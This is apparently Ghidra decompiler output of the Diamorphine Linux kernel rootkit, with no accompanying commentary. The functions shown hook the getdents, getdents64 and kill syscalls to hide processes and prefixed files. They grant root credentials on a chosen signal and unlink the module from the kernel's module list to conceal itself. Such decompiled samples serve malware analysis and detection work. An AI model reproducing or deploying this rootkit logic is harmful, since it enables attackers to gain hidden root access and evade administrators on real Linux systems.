#include "out.h"



// WARNING: Unknown calling convention

int is_invisible(pid_t pid)

{
  undefined *puVar1;
  int iVar2;
  void *__mptr;
  undefined *puVar3;
  task_struct *p;
  task_struct *task;
  
  __fentry__();
  puVar3 = &init_task;
  do {
    puVar1 = *(undefined **)(puVar3 + 0x848);
    puVar3 = puVar1 + -0x848;
    if (puVar1 == &DAT_00102880) goto LAB_00100090;
  } while (*(int *)(puVar1 + 0x108) != pid);
  if (puVar3 != (undefined *)0x0) {
    iVar2 = __x86_return_thunk();
    return iVar2;
  }
LAB_00100090:
  iVar2 = __x86_return_thunk();
  return iVar2;
}



// WARNING: Unknown calling convention

long hacked_getdents(pt_regs *pt_regs)

{
  void *pvVar1;
  ulong uVar2;
  bool bVar3;
  int iVar4;
  int ret;
  int iVar5;
  int err;
  linux_dirent *dirent;
  void *__dest;
  linux_dirent *kdirent;
  task_struct *pscr_ret__;
  inode *d_inode;
  linux_dirent *dir;
  ulong __n;
  int fd;
  void *pvVar6;
  void *pvVar7;
  long lVar8;
  ulong uVar9;
  long in_GS_OFFSET;
  
  __fentry__();
  uVar2 = pt_regs->si;
  uVar9 = pt_regs->di;
  iVar4 = __x86_indirect_thunk_rax();
  if (0 < iVar4) {
    lVar8 = (long)iVar4;
    __dest = (void *)__kmalloc(lVar8,0xdc0);
    if (__dest != (void *)0x0) {
      __check_object_size(__dest,lVar8,0);
      iVar5 = _copy_from_user(__dest,uVar2,lVar8);
      if (iVar5 == 0) {
        bVar3 = false;
        lVar8 = *(long *)(*(long *)(*(long *)(*(long *)(*(long *)(*(long *)(*(long *)(&current_task
                                                                                     + in_GS_OFFSET)
                                                                           + 0xb70) + 0x20) + 8) +
                                             (long)(int)uVar9 * 8) + 0x18) + 0x30);
        if (*(long *)(lVar8 + 0x40) == 1) {
          bVar3 = *(uint *)(lVar8 + 0x4c) >> 0x14 == 0;
        }
        pvVar6 = (void *)0x0;
        uVar9 = 0;
        do {
          pvVar1 = (void *)((long)__dest + uVar9);
          pvVar7 = pvVar1;
          if (bVar3) {
            iVar5 = simple_strtoul((long)pvVar1 + 0x12,0,10);
            if ((iVar5 != 0) && (iVar5 = is_invisible(iVar5), iVar5 != 0)) goto LAB_001001a0;
LAB_001001b2:
            __n = (ulong)iVar4;
            uVar9 = uVar9 + *(ushort *)((long)pvVar1 + 0x10);
            pvVar6 = pvVar7;
          }
          else {
            if ((*(long *)((long)pvVar1 + 0x12) != 0x705f6e6564646968) ||
               ((*(short *)((long)pvVar1 + 0x1a) != 0x7461 ||
                (*(char *)((long)pvVar1 + 0x1c) != 'h')))) goto LAB_001001b2;
LAB_001001a0:
            if (pvVar1 != __dest) {
              *(short *)((long)pvVar6 + 0x10) =
                   *(short *)((long)pvVar6 + 0x10) + *(short *)((long)pvVar1 + 0x10);
              pvVar7 = pvVar6;
              goto LAB_001001b2;
            }
            iVar4 = iVar4 - (uint)*(ushort *)((long)__dest + 0x10);
            __n = (ulong)iVar4;
            memmove(__dest,(void *)((long)__dest + (ulong)*(ushort *)((long)__dest + 0x10)),__n);
          }
        } while (uVar9 < __n);
        if (0x7fffffff < __n) {
          do {
            invalidInstructionException();
          } while( true );
        }
        __check_object_size(__dest,__n,1);
        _copy_to_user(uVar2,__dest,__n);
      }
      kfree(__dest);
      lVar8 = __x86_return_thunk();
      return lVar8;
    }
  }
  lVar8 = __x86_return_thunk();
  return lVar8;
}



// WARNING: Unknown calling convention

long hacked_getdents64(pt_regs *pt_regs)

{
  void *pvVar1;
  ulong uVar2;
  bool bVar3;
  int iVar4;
  int ret;
  int iVar5;
  int err;
  linux_dirent *dirent;
  void *__dest;
  linux_dirent64 *kdirent;
  task_struct *pscr_ret__;
  inode *d_inode;
  linux_dirent64 *dir;
  ulong __n;
  int fd;
  void *pvVar6;
  void *pvVar7;
  long lVar8;
  ulong uVar9;
  long in_GS_OFFSET;
  
  __fentry__();
  uVar2 = pt_regs->si;
  uVar9 = pt_regs->di;
  iVar4 = __x86_indirect_thunk_rax();
  if (0 < iVar4) {
    lVar8 = (long)iVar4;
    __dest = (void *)__kmalloc(lVar8,0xdc0);
    if (__dest != (void *)0x0) {
      __check_object_size(__dest,lVar8,0);
      iVar5 = _copy_from_user(__dest,uVar2,lVar8);
      if (iVar5 == 0) {
        bVar3 = false;
        lVar8 = *(long *)(*(long *)(*(long *)(*(long *)(*(long *)(*(long *)(*(long *)(&current_task
                                                                                     + in_GS_OFFSET)
                                                                           + 0xb70) + 0x20) + 8) +
                                             (long)(int)uVar9 * 8) + 0x18) + 0x30);
        if (*(long *)(lVar8 + 0x40) == 1) {
          bVar3 = *(uint *)(lVar8 + 0x4c) >> 0x14 == 0;
        }
        pvVar6 = (void *)0x0;
        uVar9 = 0;
        do {
          pvVar1 = (void *)((long)__dest + uVar9);
          pvVar7 = pvVar1;
          if (bVar3) {
            iVar5 = simple_strtoul((long)pvVar1 + 0x13,0,10);
            if ((iVar5 != 0) && (iVar5 = is_invisible(iVar5), iVar5 != 0)) goto LAB_00100370;
LAB_00100382:
            __n = (ulong)iVar4;
            uVar9 = uVar9 + *(ushort *)((long)pvVar1 + 0x10);
            pvVar6 = pvVar7;
          }
          else {
            if ((*(long *)((long)pvVar1 + 0x13) != 0x705f6e6564646968) ||
               ((*(short *)((long)pvVar1 + 0x1b) != 0x7461 ||
                (*(char *)((long)pvVar1 + 0x1d) != 'h')))) goto LAB_00100382;
LAB_00100370:
            if (pvVar1 != __dest) {
              *(short *)((long)pvVar6 + 0x10) =
                   *(short *)((long)pvVar6 + 0x10) + *(short *)((long)pvVar1 + 0x10);
              pvVar7 = pvVar6;
              goto LAB_00100382;
            }
            iVar4 = iVar4 - (uint)*(ushort *)((long)__dest + 0x10);
            __n = (ulong)iVar4;
            memmove(__dest,(void *)((long)__dest + (ulong)*(ushort *)((long)__dest + 0x10)),__n);
          }
        } while (uVar9 < __n);
        if (0x7fffffff < __n) {
          do {
            invalidInstructionException();
          } while( true );
        }
        __check_object_size(__dest,__n,1);
        _copy_to_user(uVar2,__dest,__n);
      }
      kfree(__dest);
      lVar8 = __x86_return_thunk();
      return lVar8;
    }
  }
  lVar8 = __x86_return_thunk();
  return lVar8;
}



// WARNING: Unknown calling convention

ulong * get_syscall_table_bf(void)

{
  ulong *syscall_table;
  ulong *puVar1;
  kallsyms_lookup_name_t kallsyms_lookup_name;
  
  __fentry__();
  register_kprobe(&kp);
  unregister_kprobe(&kp);
  __x86_indirect_thunk_rbx("sys_call_table");
  puVar1 = (ulong *)__x86_return_thunk();
  return puVar1;
}



// WARNING: Unknown calling convention

task_struct * find_task(pid_t pid)

{
  undefined *puVar1;
  void *__mptr;
  task_struct *ptVar2;
  undefined *puVar3;
  task_struct *p;
  
  __fentry__();
  puVar3 = &init_task;
  do {
    puVar1 = *(undefined **)(puVar3 + 0x848);
    puVar3 = puVar1 + -0x848;
    if (puVar1 == &DAT_00102880) break;
  } while (*(int *)(puVar1 + 0x108) != pid);
  ptVar2 = (task_struct *)__x86_return_thunk();
  return ptVar2;
}



// WARNING: Unknown calling convention

int is_invisible(pid_t pid)

{
  int iVar1;
  
  __fentry__();
  if (pid != 0) {
    is_invisible(pid);
    iVar1 = __x86_return_thunk();
    return iVar1;
  }
  iVar1 = __x86_return_thunk();
  return iVar1;
}



// WARNING: Unknown calling convention

void give_root(void)

{
  long lVar1;
  cred *newcreds;
  
  __fentry__();
  lVar1 = prepare_creds();
  if (lVar1 != 0) {
    *(undefined8 *)(lVar1 + 4) = 0;
    *(undefined8 *)(lVar1 + 0xc) = 0;
    *(undefined8 *)(lVar1 + 0x14) = 0;
    *(undefined8 *)(lVar1 + 0x1c) = 0;
    commit_creds(lVar1);
  }
  __x86_return_thunk();
  return;
}



// WARNING: Unknown calling convention

int hacked_kill(pt_regs *pt_regs)

{
  undefined *puVar1;
  list_head *plVar2;
  int sig;
  int iVar3;
  void *__mptr;
  undefined *puVar4;
  task_struct *p;
  task_struct *task;
  
  __fentry__();
  plVar2 = module_previous;
  iVar3 = (int)pt_regs->si;
  if (iVar3 == 0x39) {
    give_root();
    iVar3 = __x86_return_thunk();
    return iVar3;
  }
  if (iVar3 == 0x3f) {
    if (module_hidden != 0) {
      __this_module.list.next = module_previous->next;
      (__this_module.list.next)->prev = &__this_module.list;
      __this_module.list.prev = plVar2;
      module_hidden = 0;
      plVar2->next = (list_head *)0x101008;
      iVar3 = __x86_return_thunk();
      return iVar3;
    }
    module_previous = __this_module.list.prev;
    (__this_module.list.next)->prev = __this_module.list.prev;
    (__this_module.list.prev)->next = __this_module.list.next;
    __this_module.list.next = (list_head *)0xdead000000000100;
    __this_module.list.prev = (list_head *)0xdead000000000122;
    module_hidden = 1;
    iVar3 = __x86_return_thunk();
    return iVar3;
  }
  if (iVar3 != 0x1f) {
    __x86_indirect_thunk_rax();
    iVar3 = __x86_return_thunk();
    return iVar3;
  }
  puVar4 = &init_task;
  do {
    puVar1 = *(undefined **)(puVar4 + 0x848);
    puVar4 = puVar1 + -0x848;
    if (puVar1 == &DAT_00102880) goto LAB_001005a5;
  } while (*(int *)&pt_regs->di != *(int *)(puVar1 + 0x108));
  if (puVar4 != (undefined *)0x0) {
    *(uint *)(puVar1 + -0x81c) = *(uint *)(puVar1 + -0x81c) ^ 0x10000000;
    iVar3 = __x86_return_thunk();
    return iVar3;
  }
LAB_001005a5:
  iVar3 = __x86_return_thunk();
  return iVar3;
}



// WARNING: Unknown calling convention

void module_show(void)

{
  __fentry__();
  __this_module.list.prev = module_previous;
  __this_module.list.next = module_previous->next;
  (__this_module.list.next)->prev = &__this_module.list;
  (__this_module.list.prev)->next = (list_head *)0x101008;
  module_hidden = 0;
  __x86_return_thunk();
  return;
}



// WARNING: Unknown calling convention

void module_hide(void)

{
  __fentry__();
  module_previous = __this_module.list.prev;
  (__this_module.list.next)->prev = __this_module.list.prev;
  (__this_module.list.prev)->next = __this_module.list.next;
  __this_module.list.next = (list_head *)0xdead000000000100;
  __this_module.list.prev = (list_head *)0xdead000000000122;
  module_hidden = 1;
  __x86_return_thunk();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// WARNING: Unknown calling convention

int diamorphine_init(void)

{
  long lVar1;
  ulong *puVar2;
  int iVar3;
  ulong __eax;
  long in_GS_OFFSET;
  ulong __force_order;
  
  __fentry__();
  lVar1 = *(long *)(in_GS_OFFSET + 0x28);
  __sys_call_table = get_syscall_table_bf();
  if (__sys_call_table != (ulong *)0x0) {
    cr0 = (*_commit_creds)();
    module_hidden = 1;
    (__this_module.list.next)->prev = __this_module.list.prev;
    (__this_module.list.prev)->next = __this_module.list.next;
    module_previous = __this_module.list.prev;
    __this_module.list.next = (list_head *)0xdead000000000100;
    __this_module.list.prev = (list_head *)0xdead000000000122;
    kfree(__this_module.sect_attrs);
    puVar2 = __sys_call_table;
    __this_module.sect_attrs = (module_sect_attrs *)0x0;
    orig_getdents = (t_syscall)__sys_call_table[0x4e];
    orig_getdents64 = (t_syscall)__sys_call_table[0xd9];
    orig_kill = (t_syscall)__sys_call_table[0x3e];
    __sys_call_table[0x4e] = (ulong)hacked_getdents;
    puVar2[0xd9] = (ulong)hacked_getdents64;
    puVar2[0x3e] = (ulong)hacked_kill;
  }
  if (lVar1 != *(long *)(in_GS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  iVar3 = __x86_return_thunk();
  return iVar3;
}



// WARNING: Unknown calling convention

void diamorphine_cleanup(void)

{
  long lVar1;
  ulong *puVar2;
  long in_GS_OFFSET;
  ulong __force_order;
  
  puVar2 = __sys_call_table;
  lVar1 = *(long *)(in_GS_OFFSET + 0x28);
  __sys_call_table[0x4e] = (ulong)orig_getdents;
  puVar2[0xd9] = (ulong)orig_getdents64;
  puVar2[0x3e] = (ulong)orig_kill;
  if (lVar1 != *(long *)(in_GS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  __x86_return_thunk();
  return;
}
